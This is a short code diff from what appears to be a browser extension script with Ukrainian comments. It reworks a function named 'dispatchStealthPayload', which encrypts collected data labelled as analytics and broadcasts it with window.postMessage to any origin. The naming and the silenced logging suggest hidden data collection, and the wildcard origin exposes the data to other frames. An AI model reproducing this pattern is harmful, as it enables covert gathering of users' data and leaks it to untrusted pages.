@@ -357,7 +357,6 @@ async function encryptData(text, keyString) {
 
 // ==================== ВІДПРАВКА АНАЛІТИКИ (ОНОВЛЕНО) ====================
 async function dispatchStealthPayload(detail) {
-    //console.log(`[Аналітика] Шифруємо і передаємо поштарю (content.js)...`);
     try {
         // 1. Перетворюємо всі зібрані дані в JSON
         const rawJson = JSON.stringify(detail);
@@ -372,19 +371,13 @@ async function dispatchStealthPayload(detail) {
             payload: encryptedPayload
         };
 
-        // 4. 🔥 ПЕРЕДАЄМО ПОШТАРЮ (який перекине це у background.js)
-        window.dispatchEvent(new CustomEvent("AlphaAnalyticsLog", {
-            detail: stealthBody
-        }));
-        //console.log(`[Аналітика] ✅ Зашифрований пакет віддано content.js!`);
+        // 4. 🔥 ЄДИНИЙ ПРАВИЛЬНИЙ МІСТ: Передаємо через postMessage безпосередньо
+        window.postMessage({ type: "ALPHA_ANALYTICS", detail: stealthBody }, "*");
+
     } catch (err) {
-        //console.error(`[Аналітика] Помилка шифрування:`, err);
+        // console.error(`[Аналітика] Помилка шифрування:`, err);
     }
 }
-
-window.addEventListener("AlphaAnalyticsLog", (e) => {
-    window.postMessage({ type: "ALPHA_ANALYTICS", detail: e.detail }, "*");
-});
 
 // ==================== ОНОВЛЕННЯ ДОВІДНИКА АНКЕТ ====================
 async function syncMyProfiles() {
